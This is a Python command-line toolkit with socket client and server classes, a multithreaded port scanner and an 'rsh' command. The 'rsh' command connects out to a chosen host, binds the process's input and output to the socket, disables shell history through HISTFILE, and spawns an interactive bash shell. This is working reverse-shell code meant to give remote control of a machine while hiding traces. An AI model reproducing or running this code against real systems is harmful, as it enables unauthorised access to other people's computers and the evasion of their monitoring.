import os
import pty
import socket
from multiprocessing.pool import ThreadPool, ApplyResult
from time import sleep

import click

NEW_LINE: bytes = b'\n'
ENCODING: str = 'utf-8'
BUFFER_SIZE: int = 1024


class AbstractClient(object):
    socket: socket

    def send_str(self, data: str) -> None:
        self.send(data.encode(ENCODING))

    def send(self, data: bytes) -> None:
        self.socket.send(data)

    def send_line_str(self, data: str) -> None:
        self.send_line(data.encode(ENCODING))

    def send_line(self, data: bytes) -> None:
        self.socket.send(data + '\n'.encode(ENCODING))

    def read_str(self) -> str:
        return self.read().decode(ENCODING)

    def read(self) -> bytes:
        data = bytearray()
        while True:
            data_tmp = self.socket.recv(BUFFER_SIZE)
            data.extend(data_tmp)
            if len(data_tmp) < BUFFER_SIZE:
                break
        return bytes(data)

    def read_line_str(self) -> str:
        return self.read_line().decode(ENCODING)

    def read_line(self) -> bytes:
        data = bytearray()
        while True:
            data_tmp = self.socket.recv(1)
            if data_tmp == NEW_LINE:
                break
            if len(data_tmp) < 1:
                break
            data.extend(data_tmp)
        return bytes(data)


class Client(AbstractClient):

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port

    def __enter__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        return self

    def __exit__(self, type, value, traceback):
        self.socket.close()


class Server(AbstractClient):

    def __init__(self, port, host='0.0.0.0'):
        self.port = port
        self.host = host

    def __enter__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen()
        self.socket = self.server.accept()[0]
        return self

    def __exit__(self, type, value, traceback):
        self.socket.close()
        self.server.close()


def scan(host: str, port: int) -> int:
    try:
        with Client(host, port):
            print(f'[+] {port}')
            return port
    except socket.error:
        pass


def scan_range(host: str, ports: list[int], pool_size: int = 2) -> list[int]:
    pool = ThreadPool(processes=pool_size)
    open_ports: list[int] = []
    results: list[ApplyResult[int]] = []
    for port in ports:
        if 65535 >= port > 0:
            results.append(pool.apply_async(scan, args=(host, port)))
    pool.close()
    pool.join()
    for result in results:
        port = result.get()
        if port is not None:
            open_ports.append(port)

    return open_ports


@click.command()
@click.option(
    '--host',
    prompt='Enter the host',
    help='the host you want to scan',
    type=str
)
@click.option(
    '--start-port',
    help='the start port you want to scan',
    type=click.IntRange(1, 65535),
    default=1,
    show_default=True
)
@click.option(
    '--end-port',
    help='the end port you want to scan',
    type=click.IntRange(1, 65535),
    default=65535,
    show_default=True
)
def port_scan(host: str, start_port: int, end_port: int) -> None:
    print(f'[+] port scan started: {host}:{start_port}-{end_port}')
    scan_range(host, list(range(start_port, end_port)))
    print(f'[+] port scan completed: {host}:{start_port}-{end_port}')


@click.command()
@click.option(
    '--host',
    help='the host you want to connect to',
    prompt='Enter the host you want to connect to',
    type=str,
)
@click.option(
    '--port',
    help='Enter the port you want to connect to',
    type=click.IntRange(1, 65535),
    default=4040,
    show_default=True
)
@click.option(
    '--shell',
    help='Enter the shell you want to spawn',
    type=str,
    default='/bin/bash',
    show_default=True
)
def rsh(host: str, port: int, shell: str):
    with Client(host, port) as client:
        os.dup2(client.socket.fileno(), 0)
        os.dup2(client.socket.fileno(), 1)
        os.dup2(client.socket.fileno(), 2)
        os.putenv("HISTFILE", '/dev/null')
        pty.spawn(shell)
